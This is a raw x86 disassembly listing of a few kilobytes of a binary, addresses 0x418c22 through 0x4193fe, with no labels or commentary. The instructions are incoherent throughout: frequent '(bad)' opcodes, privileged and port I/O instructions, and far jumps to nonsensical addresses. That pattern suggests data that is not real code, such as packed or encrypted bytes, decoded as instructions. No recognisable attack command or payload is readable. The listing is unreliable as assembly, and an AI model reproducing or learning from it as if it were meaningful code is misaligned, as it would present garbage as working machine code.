  418c22:	push   edx
  418c23:	or     BYTE PTR [eax+0x3],dh
  418c26:	pop    ecx
  418c27:	les    edi,FWORD PTR [ecx]
  418c29:	cmp    al,0xc9
  418c2b:	jae    0x418baf
  418c2d:	scas   eax,DWORD PTR es:[edi]
  418c2e:	stos   DWORD PTR es:[edi],eax
  418c2f:	mov    ?,WORD PTR [edi]
  418c31:	sub    esp,eax
  418c33:	jl     0x418c6b
  418c35:	sar    ecx,cl
  418c37:	fxch   st(5)
  418c39:	bound  ecx,QWORD PTR [edi]
  418c3b:	push   edi
  418c3c:	xor    BYTE PTR [edx+ebp*8+0x302f3212],dh
  418c43:	mov    esp,0x3cef79c4
  418c48:	aad    0xee
  418c4a:	imul   ebp,edx,0xb3d9b97a
  418c50:	xor    eax,0x8bdc7ac6
  418c55:	cmp    BYTE PTR [esi+esi*4],dl
  418c58:	nop
  418c59:	lock sub esi,DWORD PTR [ebx+esi*4]
  418c5d:	mov    bl,0x25
  418c5f:	frstor [ebx-0x45e65860]
  418c65:	ret    
  418c66:	retf   0xece0
  418c69:	and    al,0xac
  418c6b:	or     esi,eax
  418c6d:	add    al,0xc3
  418c6f:	cmp    BYTE PTR [eax+eiz*1],0x69
  418c73:	arpl   WORD PTR [ebx+0x3b],bp
  418c76:	mov    eax,0x9e7f3f66
  418c7b:	fadd   QWORD PTR ds:0xf46c830c
  418c81:	je     0x418c2d
  418c83:	fstp   QWORD PTR [ebp+0x7e]
  418c86:	adc    al,0x47
  418c88:	bound  ebp,QWORD PTR [ebx+0x431b7f7c]
  418c8e:	icebp  
  418c8f:	data16 std 
  418c91:	out    dx,al
  418c92:	mov    ah,BYTE PTR [ebx+0x3b9fcbcd]
  418c98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c99:	jmp    0xb91c:0xfdd0afdf
  418ca0:	iret   
  418ca1:	in     al,dx
  418ca2:	sysenter 
  418ca4:	imul   esi,DWORD PTR [edi+0x6b],0xffffffdf
  418ca8:	cli    
  418ca9:	xchg   edi,eax
  418caa:	fisub  DWORD PTR [esi]
  418cac:	repz inc eax
  418cae:	ret    
  418caf:	xchg   ecx,eax
  418cb0:	jmp    0x483b:0x9646109f
  418cb7:	cmc    
  418cb8:	cmp    ah,bh
  418cba:	adc    dh,BYTE PTR [esi+0x1c9638b8]
  418cc0:	cs retf 0x8174
  418cc4:	inc    ecx
  418cc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cc6:	inc    DWORD PTR [eax-0x5636406a]
  418ccc:	ss dec edi
  418cce:	imul   edx,edx,0x53ddff7
  418cd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cd5:	lds    ecx,FWORD PTR [esi-0x5e]
  418cd8:	dec    ecx
  418cd9:	push   ebp
  418cda:	shl    BYTE PTR [edx],1
  418cdc:	sub    al,0x2d
  418cde:	push   0xffffffff
  418ce0:	shl    DWORD PTR [ecx],cl
  418ce2:	jb     0x418cd8
  418ce4:	jne    0x418d17
  418ce6:	in     al,dx
  418ce7:	and    cl,BYTE PTR [eax]
  418ce9:	xlat   BYTE PTR ds:[ebx]
  418cea:	inc    esi
  418ceb:	test   eax,0x8a97d5e4
  418cf0:	adc    ah,dl
  418cf2:	jae    0x418c9c
  418cf4:	jecxz  0x418ca3
  418cf6:	xchg   BYTE PTR [ebp-0x463785e5],ah
  418cfc:	inc    edi
  418cfd:	les    esi,FWORD PTR [eax-0x15c5f97e]
  418d03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d04:	inc    esi
  418d05:	repnz retf 
  418d07:	lds    ecx,FWORD PTR ds:0xc9f29e13
  418d0d:	or     ebx,esp
  418d0f:	pop    esi
  418d10:	fcmovb st,st(7)
  418d12:	in     eax,0xa2
  418d14:	mov    al,0x6c
  418d16:	ins    BYTE PTR es:[edi],dx
  418d17:	mov    al,ds:0x1f7041bf
  418d1c:	loope  0x418d4c
  418d1e:	cmp    al,0xb0
  418d20:	or     BYTE PTR [ecx],ah
  418d22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d23:	outs   dx,BYTE PTR ds:[esi]
  418d24:	mov    esi,DWORD PTR [ebx]
  418d26:	outs   dx,BYTE PTR ds:[esi]
  418d27:	inc    ebp
  418d28:	sub    eax,0xcd8fd2e8
  418d2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d2e:	es xchg esp,eax
  418d30:	(bad)
  418d33:	pop    ecx
  418d34:	in     al,dx
  418d35:	pop    edi
  418d36:	and    BYTE PTR [edx-0x6e8ce86e],ah
  418d3c:	call   0x99c771b2
  418d41:	and    al,0x36
  418d43:	dec    ecx
  418d44:	lea    edi,[edi+eax*1+0x44fdea46]
  418d4b:	adc    al,0x89
  418d4d:	add    DWORD PTR [edx-0x47],ebp
  418d50:	sub    BYTE PTR [esi-0x13],dh
  418d53:	std    
  418d54:	inc    ecx
  418d55:	jb     0x418d70
  418d57:	and    dl,bl
  418d59:	test   al,0xd1
  418d5b:	int3   
  418d5c:	add    eax,0xdffae7e3
  418d61:	arpl   cx,bx
  418d63:	mov    ebp,0x850417eb
  418d68:	call   0x4533:0x814180fb
  418d6f:	mov    eax,0x34355fce
  418d74:	cmp    eax,0x11c375aa
  418d79:	dec    edx
  418d7a:	sub    DWORD PTR [ebp-0x339bb9],0x7d
  418d81:	lea    edi,[edx-0x768a12a4]
  418d87:	pop    ecx
  418d88:	sub    DWORD PTR [edi],ecx
  418d8a:	fs stc 
  418d8c:	test   BYTE PTR [esi],al
  418d8e:	data16 fsubp st(7),st
  418d91:	(bad)  
  418d92:	or     eax,DWORD PTR [eax+ebp*8]
  418d95:	xchg   bl,bl
  418d97:	push   edi
  418d98:	retf   
  418d99:	push   esp
  418d9a:	or     dh,BYTE PTR [ebx+0x6c]
  418d9d:	minps  xmm1,XMMWORD PTR [ecx-0x3d]
  418da1:	mov    ebx,0xac466afa
  418da6:	jp     0x418dd5
  418da8:	xchg   esi,eax
  418da9:	inc    eax
  418daa:	in     eax,dx
  418dab:	(bad)  
  418dac:	les    ecx,FWORD PTR [edx]
  418dae:	and    DWORD PTR [edx],esi
  418db0:	push   edx
  418db1:	cmp    DWORD PTR [ebx+0x62],edi
  418db4:	sub    BYTE PTR [edi-0x21],bh
  418db7:	sti    
  418db8:	outs   dx,BYTE PTR ds:[esi]
  418db9:	jno    0x418e13
  418dbb:	repz sub edi,ebp
  418dbe:	in     eax,dx
  418dbf:	inc    edi
  418dc0:	cwde   
  418dc1:	and    esi,edx
  418dc3:	jae    0x418daa
  418dc5:	into   
  418dc6:	pusha  
  418dc7:	inc    esp
  418dc8:	fmul   DWORD PTR [edx+0x70bd3aa5]
  418dce:	and    BYTE PTR [edx+ecx*4-0x63],dl
  418dd2:	loope  0x418e40
  418dd4:	leave  
  418dd5:	pop    ebp
  418dd6:	sub    DWORD PTR [esi+0x35],eax
  418dd9:	cmp    eax,0x2beecbf2
  418dde:	mov    WORD PTR [ebp-0xc],gs
  418de1:	or     DWORD PTR [edx],0xa67467c
  418de7:	xor    al,ah
  418de9:	jmp    0x2981:0x90593052
  418df0:	jnp    0x418e47
  418df2:	dec    edx
  418df3:	sbb    edi,0xfcb376d5
  418df9:	repz xchg eax,ebp
  418dfc:	cmp    eax,0xced86eb3
  418e01:	aad    0x26
  418e03:	sub    BYTE PTR [ebp-0x1d],0x21
  418e07:	mov    al,0xe9
  418e09:	cmp    eax,0xa44596c4
  418e0e:	sbb    BYTE PTR [edi-0x71],ch
  418e11:	and    al,0xbf
  418e13:	adc    ecx,DWORD PTR [edi]
  418e15:	mov    ecx,0x4599b49c
  418e1a:	and    BYTE PTR [esp+eiz*4-0x60d98f54],cl
  418e21:	sahf   
  418e22:	push   ebp
  418e23:	fwait
  418e24:	arpl   WORD PTR [eax],cx
  418e26:	in     eax,0xc1
  418e28:	icebp  
  418e29:	pop    ds
  418e2a:	jmp    0xcad33c46
  418e2f:	xor    dl,BYTE PTR [esi+0x7ced3aca]
  418e35:	adc    eax,0xb96caa04
  418e3a:	sub    DWORD PTR [edx-0x42],edx
  418e3d:	xor    cl,BYTE PTR [edx-0x5c06df3e]
  418e43:	jmp    0x99b888b8
  418e48:	mov    bl,0x83
  418e4a:	xlat   BYTE PTR ds:[ebx]
  418e4b:	daa    
  418e4c:	stc    
  418e4d:	leave  
  418e4e:	xchg   BYTE PTR [esi-0x6cd11651],dh
  418e54:	stos   DWORD PTR es:[edi],eax
  418e55:	in     al,dx
  418e56:	packsswb mm5,QWORD PTR [edi]
  418e59:	pop    esi
  418e5a:	and    edx,ebp
  418e5c:	xor    bl,BYTE PTR [edx-0x5eaa66d]
  418e62:	jae    0x418e2e
  418e64:	(bad)  
  418e65:	adc    eax,0xe1204bcd
  418e6a:	push   esi
  418e6b:	adc    DWORD PTR [ebx-0x25],0x4be4e3b7
  418e72:	lods   al,BYTE PTR ss:[esi]
  418e74:	adc    al,0xaa
  418e76:	aaa    
  418e77:	ds shl cl,1
  418e7a:	rcl    BYTE PTR [eax],0x99
  418e7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e7e:	mov    ecx,0xa01da849
  418e83:	jbe    0x418ec7
  418e85:	inc    BYTE PTR [edi-0x1f]
  418e88:	push   esp
  418e89:	jmp    0x418e45
  418e8b:	mov    ebp,0x9b7d3297
  418e90:	cmp    al,0x16
  418e92:	dec    ecx
  418e93:	jno    0x418e32
  418e95:	stc    
  418e96:	in     eax,dx
  418e97:	sub    DWORD PTR [ecx-0x24b4bf64],esi
  418e9d:	cmp    esp,DWORD PTR [esi+0x7afba6c2]
  418ea3:	aad    0x89
  418ea5:	add    al,0xe
  418ea7:	dec    ebp
  418ea8:	mov    dh,0x37
  418eaa:	jmp    0x418f12
  418eac:	in     eax,0x1
  418eae:	jecxz  0x418f23
  418eb0:	(bad)  
  418eb2:	push   ds
  418eb3:	or     BYTE PTR [esi+0x2f],cl
  418eb6:	mov    dh,0x75
  418eb8:	jb     0x418eab
  418eba:	sar    DWORD PTR [esp+ebp*8-0x35261189],0x22
  418ec2:	jg     0x418e96
  418ec4:	sahf   
  418ec5:	dec    ebx
  418ec6:	aaa    
  418ec7:	test   al,0xeb
  418ec9:	std    
  418eca:	and    DWORD PTR [esi+0x6e],edi
  418ecd:	fist   WORD PTR [ebp+0x72]
  418ed0:	test   BYTE PTR [edi+eax*4],bh
  418ed3:	imul   esp,DWORD PTR [edx],0x5c23579e
  418ed9:	js     0x418f50
  418edb:	and    eax,0xa2318fec
  418ee0:	dec    esp
  418ee1:	in     eax,0x7a
  418ee3:	jb     0x418edf
  418ee5:	sbb    eax,0x17f98f34
  418eea:	repnz add al,0x84
  418eed:	lock push ds
  418eef:	pushf  
  418ef0:	gs (bad) 
  418ef3:	fcomp  st(6)
  418ef5:	(bad)  
  418ef6:	outs   dx,DWORD PTR ds:[esi]
  418ef7:	icebp  
  418ef8:	jae    0x418f65
  418efa:	sbb    bh,ch
  418efc:	xchg   ebx,eax
  418efd:	adc    ah,BYTE PTR [edi-0x60]
  418f00:	imul   esp,edi,0xffffffab
  418f03:	(bad)  
  418f04:	sti    
  418f05:	add    BYTE PTR [eax+0x887ae3b],al
  418f0b:	jg     0x418f2c
  418f0d:	push   ss
  418f0e:	xor    al,BYTE PTR [edx+0x20996db3]
  418f14:	xor    edi,DWORD PTR [edx+0x68]
  418f17:	cmp    BYTE PTR [ebp+0x61],bl
  418f1a:	dec    DWORD PTR [ebx-0x62]
  418f1d:	iret   
  418f1e:	mov    al,0x1a
  418f20:	mov    ds:0x3cdde8ad,eax
  418f25:	out    0xbc,al
  418f27:	icebp  
  418f28:	scas   al,BYTE PTR es:[edi]
  418f29:	nop
  418f2a:	in     eax,dx
  418f2b:	cmc    
  418f2c:	sub    esi,ebp
  418f2e:	mov    eax,ds:0xe139007
  418f33:	repz adc ah,BYTE PTR [edi]
  418f36:	push   ecx
  418f37:	or     al,0x69
  418f39:	jno    0x418f05
  418f3b:	mov    ch,0x6b
  418f3d:	and    eax,0xfb29b4f5
  418f42:	nop
  418f43:	imul   dh
  418f45:	pop    edx
  418f46:	(bad)  
  418f47:	not    DWORD PTR [esi+0x6f]
  418f4a:	fwait
  418f4b:	jp     0x418ed8
  418f4d:	add    esi,edi
  418f4f:	mov    ah,BYTE PTR [esi]
  418f51:	push   ecx
  418f52:	inc    edx
  418f53:	jmp    0xe994:0x5b21c4db
  418f5a:	out    dx,eax
  418f5b:	push   edi
  418f5c:	mov    ebx,0xd745bbfa
  418f61:	pusha  
  418f62:	fistp  DWORD PTR [ebx]
  418f64:	dec    edi
  418f65:	rcl    DWORD PTR [edi+0x4c56c0b7],cl
  418f6b:	call   0xe901:0x7d586738
  418f72:	fisubr WORD PTR [eax-0x5b]
  418f75:	mov    al,ds:0x7dfa8a06
  418f7a:	inc    esi
  418f7b:	(bad)  
  418f7c:	retf   
  418f7d:	mov    bl,0x8
  418f7f:	call   0xbef1a400
  418f84:	xchg   esi,eax
  418f85:	shl    BYTE PTR [eax],1
  418f87:	mov    cl,BYTE PTR [esi+ebx*8]
  418f8a:	sahf   
  418f8b:	fwait
  418f8c:	mov    bh,BYTE PTR [ebx-0x3e]
  418f8f:	add    bh,BYTE PTR ds:0xe8c7c0e0
  418f95:	sbb    esi,0x53
  418f98:	pop    ebx
  418f99:	daa    
  418f9a:	lahf   
  418f9b:	cmp    BYTE PTR [edi+esi*1],dl
  418f9e:	cmp    dh,ch
  418fa0:	and    DWORD PTR [ebx],ebx
  418fa2:	cmp    DWORD PTR [eax],0xffffffae
  418fa5:	test   ch,ah
  418fa7:	xor    al,0xfc
  418fa9:	push   esp
  418faa:	test   eax,0x9cf05824
  418faf:	outs   dx,BYTE PTR ds:[esi]
  418fb0:	pop    esp
  418fb1:	mov    al,BYTE PTR [edi-0x5c6021c3]
  418fb7:	or     eax,0xc4480432
  418fbc:	mov    bl,0x7d
  418fbe:	cdq    
  418fbf:	clc    
  418fc0:	popa   
  418fc1:	mov    ds:0x28ff3582,al
  418fc6:	jge    0x419022
  418fc8:	pop    eax
  418fc9:	inc    esp
  418fca:	push   ebp
  418fcb:	(bad)  
  418fcc:	scas   al,BYTE PTR es:[edi]
  418fcd:	arpl   ax,bx
  418fcf:	sub    BYTE PTR [edi-0x3c],0x57
  418fd3:	out    0xd2,eax
  418fd5:	push   ebp
  418fd6:	into   
  418fd7:	add    DWORD PTR [esi-0x59d2b5b2],edi
  418fdd:	ins    BYTE PTR es:[edi],dx
  418fde:	mov    bh,0x7f
  418fe0:	mov    ebx,0x321b8cc3
  418fe5:	sti    
  418fe6:	ret    0xa9ae
  418fe9:	outs   dx,DWORD PTR ds:[esi]
  418fea:	jne    0x418f7e
  418fec:	dec    ebp
  418fed:	dec    edi
  418fee:	dec    ecx
  418fef:	ja     0x41902b
  418ff1:	(bad)  
  418ff2:	mov    eax,0xe208b597
  418ff7:	mov    al,0xa9
  418ff9:	loope  0x41906f
  418ffb:	jg     0x419048
  418ffd:	push   cs
  418ffe:	inc    ebp
  418fff:	adc    al,0x1e
  419002:	loop   0x418fce
  419004:	icebp  
  419005:	test   ax,0xc91c
  419009:	aas    
  41900a:	fdiv   st,st(4)
  41900c:	cwde   
  41900d:	repnz scas eax,DWORD PTR es:[edi]
  41900f:	jb     0x418fd4
  419011:	add    DWORD PTR [ebx-0x476da492],ecx
  419017:	adc    ecx,edx
  419019:	iret   
  41901a:	xchg   esi,eax
  41901b:	mov    cl,0x90
  41901d:	or     BYTE PTR [ecx+0x42dea879],0x14
  419024:	add    WORD PTR [eax],ax
  419027:	xchg   ebp,eax
  419028:	mov    dl,0xf9
  41902a:	(bad)  
  41902b:	jmp    DWORD PTR [ecx+edx*8+0x26ea7cbd]
  419032:	ss jmp 0xe813:0x106fbe82
  41903a:	(bad)  
  41903b:	inc    DWORD PTR [edx]
  41903d:	add    esi,esp
  41903f:	out    dx,al
  419040:	fbld   TBYTE PTR [ecx]
  419042:	out    dx,eax
  419043:	les    edi,FWORD PTR [esi-0x383b5e19]
  419049:	repnz xlat BYTE PTR ds:[ebx]
  41904b:	jmp    0x8a6:0x962c7119
  419052:	or     esp,esp
  419054:	cmovs  edi,DWORD PTR [eax]
  419057:	sbb    al,0x12
  419059:	adc    eax,0x4de96cd1
  41905e:	mov    al,0x12
  419060:	stos   BYTE PTR es:[edi],al
  419061:	std    
  419062:	inc    eax
  419063:	dec    edi
  419064:	in     eax,0x2c
  419066:	dec    ecx
  419067:	mov    eax,0x3c7ca8e6
  41906c:	sub    DWORD PTR [ebx-0x362579c2],edx
  419072:	sar    esp,0x72
  419075:	in     al,0xf
  419077:	adc    BYTE PTR [edi],dl
  419079:	xchg   ebp,eax
  41907a:	sub    dh,BYTE PTR [ebp+0xc]
  41907d:	leave  
  41907e:	idiv   DWORD PTR [ebx+eax*1+0x3cebadeb]
  419085:	popa   
  419086:	cli    
  419087:	aas    
  419088:	add    DWORD PTR [ecx],eax
  41908a:	inc    DWORD PTR ds:0x7e65292e
  419090:	out    0xe2,eax
  419092:	jns    0x4190d7
  419094:	repnz sub eax,0xb1ebcb72
  41909a:	or     eax,DWORD PTR [esi+ecx*4]
  41909d:	push   ebp
  41909e:	lea    edi,[eax+0x68addbeb]
  4190a4:	dec    ebp
  4190a5:	int    0xb5
  4190a7:	fwait
  4190a8:	outs   dx,DWORD PTR ds:[esi]
  4190a9:	je     0x419040
  4190ab:	mov    ebp,0xaa1a4b8e
  4190b0:	cmp    dh,BYTE PTR [ebp+0x76dd91fc]
  4190b6:	loopne 0x4190bf
  4190b8:	xchg   DWORD PTR [ebx-0x5c],edx
  4190bb:	dec    ecx
  4190bc:	aaa    
  4190bd:	pop    esp
  4190be:	inc    eax
  4190bf:	xlat   BYTE PTR ds:[ebx]
  4190c0:	mov    esp,eax
  4190c2:	lea    ebp,[eax+0x69]
  4190c5:	outs   dx,BYTE PTR ds:[esi]
  4190c6:	and    ah,bh
  4190c8:	and    ebp,DWORD PTR [ebx-0x28]
  4190cb:	jl     0x4190b4
  4190cd:	pop    ds
  4190ce:	sub    eax,0x2f005039
  4190d3:	test   eax,0x243fb702
  4190d8:	dec    edx
  4190d9:	jnp    0x419074
  4190db:	cmp    BYTE PTR [eax-0x2fb68f18],dl
  4190e1:	inc    eax
  4190e2:	inc    eax
  4190e3:	imul   BYTE PTR [esi]
  4190e5:	mov    ch,0x3d
  4190e7:	lea    ecx,[ebp-0x33712750]
  4190ed:	sub    BYTE PTR [edi-0x69],ah
  4190f0:	daa    
  4190f1:	jmp    0xd83b:0x91cc06c6
  4190f8:	(bad)  
  4190f9:	scas   al,BYTE PTR es:[edi]
  4190fa:	ja     0x41908c
  4190fc:	mov    ecx,0xf0ba8c0a
  419101:	adc    eax,0x745bd64b
  419106:	sub    ah,cl
  419108:	inc    edi
  419109:	xor    ecx,DWORD PTR [ebx-0x33]
  41910c:	test   dh,al
  41910e:	dec    BYTE PTR [eax+eiz*4-0x4d]
  419112:	mov    cl,0x2a
  419114:	call   0x24eac0ea
  419119:	or     eax,0x123ad2ae
  41911e:	sub    al,0x4e
  419120:	add    eax,0xed382448
  419125:	or     cl,al
  419127:	pusha  
  419128:	dec    edi
  419129:	out    0xa4,al
  41912b:	cmc    
  41912c:	aam    0x8b
  41912e:	mov    WORD PTR [edx+0x100d191f],ss
  419134:	xor    dl,al
  419136:	inc    esp
  419137:	mov    esp,0x2267980d
  41913c:	push   es
  41913d:	hlt    
  41913e:	fild   DWORD PTR [esi+0x2b]
  419141:	jmp    0x2df4:0x16bd9a1d
  419148:	xor    al,0x22
  41914a:	(bad)  
  41914c:	add    esp,DWORD PTR [eax-0x1e563b8]
  419152:	pushf  
  419153:	and    BYTE PTR [eax-0xf],bl
  419156:	retf   0x391e
  419159:	cmp    cl,cl
  41915b:	cs enter 0x3184,0xf3
  419160:	mov    ch,0xb9
  419162:	div    DWORD PTR [edi+0x144eb407]
  419168:	pop    ecx
  419169:	lods   eax,DWORD PTR ds:[esi]
  41916a:	sbb    esp,DWORD PTR [ecx+0x12]
  41916d:	push   eax
  41916e:	jbe    0x4191ed
  419170:	push   esp
  419171:	push   esi
  419172:	xchg   ebp,eax
  419173:	dec    edi
  419174:	je     0x4191ee
  419176:	jno    0x41915f
  419178:	push   ss
  419179:	bound  ecx,QWORD PTR [ecx]
  41917b:	jmp    0x4191d8
  41917d:	cmp    BYTE PTR [ebp-0x491f89c8],ch
  419183:	ins    DWORD PTR es:[edi],dx
  419184:	jae    0x4191eb
  419186:	jp     0x41910e
  419188:	inc    ecx
  419189:	xor    edi,DWORD PTR [ecx-0x405b3043]
  41918f:	xchg   esi,eax
  419190:	add    BYTE PTR [esi-0x6d765d],dl
  419196:	out    0xa4,eax
  419198:	(bad)  
  419199:	std    
  41919a:	sub    eax,DWORD PTR [edx]
  41919c:	leave  
  41919d:	int    0x93
  41919f:	push   0x32
  4191a1:	or     al,0xea
  4191a3:	xchg   eax,ebx
  4191a5:	jmp    0xee8c:0xf28c8519
  4191ac:	lds    eax,FWORD PTR [edx+0x70b2d953]
  4191b2:	fistp  QWORD PTR [eax+0x13]
  4191b5:	call   FWORD PTR [ebx+0x1]
  4191b8:	jg     0x419174
  4191ba:	add    bl,BYTE PTR [eax]
  4191bc:	inc    ecx
  4191bd:	push   es
  4191be:	std    
  4191bf:	mov    eax,0xae2e6776
  4191c4:	int    0x7f
  4191c6:	outs   dx,DWORD PTR ds:[esi]
  4191c7:	rcl    DWORD PTR [eax+0x41ee8717],cl
  4191cd:	dec    esp
  4191ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191cf:	sbb    eax,0x86b92399
  4191d4:	(bad)  
  4191d6:	repnz lea ecx,[edi-0x298653ac]
  4191dd:	push   esi
  4191de:	sbb    al,0xfe
  4191e0:	outs   dx,DWORD PTR ds:[esi]
  4191e1:	stos   BYTE PTR es:[edi],al
  4191e2:	fwait
  4191e3:	sub    edx,DWORD PTR [ecx+0x15]
  4191e6:	dec    esi
  4191e7:	sub    al,0x25
  4191e9:	aam    0x2
  4191eb:	jmp    0x4191e2
  4191ed:	xchg   BYTE PTR [edx-0x7c],ah
  4191f0:	cmp    al,0x57
  4191f2:	sar    DWORD PTR [ebp+0x42],1
  4191f5:	jge    0x41925f
  4191f7:	enter  0x25be,0x1
  4191fb:	arpl   dx,bp
  4191fd:	add    al,0x18
  4191ff:	mov    DWORD PTR [eax+ebp*8+0x271a58ef],0x99b21998
  41920a:	mov    DWORD PTR [ebx-0x3e46f369],ecx
  419210:	mov    dh,BYTE PTR [eax+edi*1]
  419213:	push   es
  419214:	sahf   
  419215:	or     eax,0x7c945705
  41921a:	adc    DWORD PTR [eax-0x5491227],edi
  419220:	enter  0x205c,0x42
  419224:	das    
  419225:	xor    DWORD PTR [edx-0x34d35233],esi
  41922b:	or     BYTE PTR [ecx-0x75],dh
  41922e:	cwde   
  41922f:	(bad)  
  419230:	fcom   QWORD PTR [ebx+0x5c035354]
  419236:	mov    ecx,0xe263ea8e
  41923b:	sbb    ch,ch
  41923d:	movlps QWORD PTR [edi+0x76],xmm6
  419241:	adc    eax,0x9ee5baeb
  419246:	adc    bh,ch
  419248:	lods   al,BYTE PTR ds:[esi]
  419249:	popf   
  41924a:	mov    al,ds:0xd46e095f
  41924f:	stos   BYTE PTR es:[edi],al
  419250:	sub    al,0xce
  419252:	push   es
  419253:	loop   0x4192ce
  419255:	mov    ds:0x9900d50f,eax
  41925a:	popa   
  41925b:	xchg   BYTE PTR [ebx],ch
  41925d:	in     al,dx
  41925e:	mov    dh,0x51
  419260:	lea    esp,[eax+0x7bb7196c]
  419266:	sar    BYTE PTR [ebx*1-0x5d4fbb29],cl
  41926d:	cli    
  41926e:	mov    edi,0x74236a83
  419273:	lods   eax,DWORD PTR ds:[esi]
  419274:	mov    WORD PTR [esi],gs
  419276:	xor    al,0x29
  419278:	push   0xffffffdd
  41927a:	in     al,dx
  41927b:	daa    
  41927c:	std    
  41927d:	fsubr  DWORD PTR [edi+0x59b345f6]
  419283:	dec    esp
  419284:	test   DWORD PTR [ecx+edx*8-0x57f15c0a],0xb815bfd1
  41928f:	push   ebx
  419290:	jo     0x4192d8
  419292:	push   ebx
  419293:	ds fcmovne st,st(2)
  419296:	pop    ebx
  419297:	sbb    eax,0x75c138cf
  41929c:	in     eax,0x8b
  41929e:	jne    0x41926d
  4192a0:	aas    
  4192a1:	dec    esi
  4192a2:	mov    al,ds:0xf27ca451
  4192a7:	stc    
  4192a8:	je     0x419237
  4192aa:	mov    edi,0xdbf193a6
  4192af:	gs sbb ecx,esp
  4192b2:	xor    BYTE PTR [ecx-0x1f96188b],bl
  4192b8:	cmp    DWORD PTR [edx],esi
  4192ba:	dec    edi
  4192bb:	inc    ebx
  4192bc:	dec    eax
  4192bd:	popf   
  4192be:	stos   BYTE PTR es:[edi],al
  4192bf:	dec    esp
  4192c0:	xlat   BYTE PTR ds:[ebx]
  4192c1:	mov    dh,0xd5
  4192c3:	pop    ebp
  4192c4:	(bad)  
  4192c5:	out    0x7c,al
  4192c7:	retf   
  4192c8:	jmp    0xb83b:0xe27ea40a
  4192cf:	cld    
  4192d0:	mov    al,ds:0x8264ae68
  4192d5:	fldenv [ebx]
  4192d7:	popf   
  4192d8:	retf   
  4192d9:	retf   
  4192da:	push   ss
  4192db:	sub    bl,BYTE PTR [edi]
  4192dd:	leave  
  4192de:	pop    edi
  4192df:	add    dl,BYTE PTR [edi*8-0x66a1df24]
  4192e6:	arpl   WORD PTR [ebp-0x52],ax
  4192e9:	sti    
  4192ea:	mov    dh,0x37
  4192ec:	pop    esi
  4192ed:	jg     0x4192a5
  4192ef:	mov    ch,0x11
  4192f1:	in     eax,dx
  4192f2:	das    
  4192f3:	std    
  4192f4:	iret   
  4192f5:	dec    esi
  4192f6:	loope  0x4192a0
  4192f8:	add    al,0x7f
  4192fa:	loopne 0x41934c
  4192fc:	out    0x9d,eax
  4192fe:	cli    
  4192ff:	pop    ebp
  419300:	push   es
  419301:	mov    bh,0x75
  419303:	in     al,dx
  419304:	pop    ebx
  419305:	mov    ch,0x57
  419307:	sub    BYTE PTR [edi],dh
  419309:	push   edx
  41930a:	push   edi
  41930b:	xchg   edx,eax
  41930c:	mov    ebp,0x1202c9dd
  419311:	mov    dh,0x27
  419313:	fmul   DWORD PTR [esi-0x7e8d3d3]
  419319:	sbb    ah,0xcc
  41931c:	adc    al,bh
  41931e:	mov    bl,0x7c
  419320:	push   es
  419321:	fwait
  419322:	jne    0x41937d
  419324:	xchg   ebp,eax
  419325:	or     dl,ch
  419327:	jl     0x41930b
  419329:	inc    eax
  41932a:	sbb    DWORD PTR [edi],edi
  41932c:	sbb    al,0xe9
  41932e:	inc    ecx
  41932f:	vmptrst QWORD PTR [esi+0x5c]
  419333:	rol    DWORD PTR [eax-0x5855d187],1
  419339:	pop    ecx
  41933a:	cmp    dh,BYTE PTR [esi-0x2850a579]
  419340:	popa   
  419341:	cmp    al,0xe3
  419343:	(bad)  
  419344:	xchg   edx,eax
  419345:	ret    
  419346:	std    
  419347:	inc    esi
  419348:	mov    ds:0x3f49e626,al
  41934d:	dec    esp
  41934e:	mov    edi,0xe3b4a8d7
  419353:	fdiv   DWORD PTR [ebx-0x36]
  419356:	bound  eax,QWORD PTR [esi-0x528a9abe]
  41935c:	sbb    ah,BYTE PTR [ebx+0x2e67ee3b]
  419362:	mov    al,0xad
  419364:	mov    dl,0x21
  419366:	xchg   esp,eax
  419367:	ss cmp ebx,ebx
  41936a:	call   0x3169:0x609b465e
  419371:	jbe    0x41937a
  419373:	ficomp WORD PTR [edx+ebp*1]
  419376:	pop    esi
  419377:	ss push edi
  419379:	out    dx,al
  41937a:	in     al,0x35
  41937c:	shr    BYTE PTR [ebx+0x5f],cl
  41937f:	cmp    DWORD PTR [edx],esi
  419381:	push   0x6d
  419383:	push   0xfb57579
  419388:	stc    
  419389:	test   al,0xd2
  41938b:	mov    esi,0x2cf4fa7
  419390:	xor    edx,esi
  419392:	mov    ebp,0x9dda8154
  419397:	cmp    eax,0xcf42eb12
  41939c:	mov    edi,0xdd31e81e
  4193a1:	or     DWORD PTR [eax+0x6565e8b8],ebx
  4193a7:	cmp    bh,cl
  4193a9:	test   DWORD PTR [ebp+0x1e],ecx
  4193ac:	stos   BYTE PTR es:[edi],al
  4193ad:	popf   
  4193ae:	or     al,0x1a
  4193b0:	sub    ah,dl
  4193b2:	into   
  4193b3:	sbb    eax,0x9f07fef9
  4193b8:	inc    ebx
  4193b9:	mov    ds:0x33079c7a,eax
  4193be:	sysenter 
  4193c0:	mov    ebx,DWORD PTR [esi+0x4]
  4193c3:	mov    ss,esi
  4193c5:	bound  esi,QWORD PTR [ebx]
  4193c7:	enter  0x7bd4,0xf3
  4193cb:	imul   esp,DWORD PTR [ecx],0x73
  4193ce:	in     eax,dx
  4193cf:	xchg   edx,eax
  4193d0:	add    cl,ch
  4193d2:	pop    es
  4193d3:	cmp    ah,bl
  4193d5:	push   edx
  4193d6:	aad    0xd2
  4193d8:	fisubr DWORD PTR [edx]
  4193da:	push   ebp
  4193db:	mov    ebx,0x48c4abab
  4193e0:	sbb    al,0x5b
  4193e2:	mov    edi,0x43c91533
  4193e7:	push   esi
  4193e8:	mov    WORD PTR [edx],es
  4193ea:	mov    ah,0x4a
  4193ec:	icebp  
  4193ed:	cli    
  4193ee:	adc    eax,0x5c1140c2
  4193f3:	xchg   ebx,ecx
  4193f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193f6:	push   ds
  4193f7:	mov    esp,DWORD PTR [ebx+0x2e]
  4193fa:	xchg   esp,eax
  4193fb:	or     esp,DWORD PTR [edi-0x32]
  4193fe:	lahf   
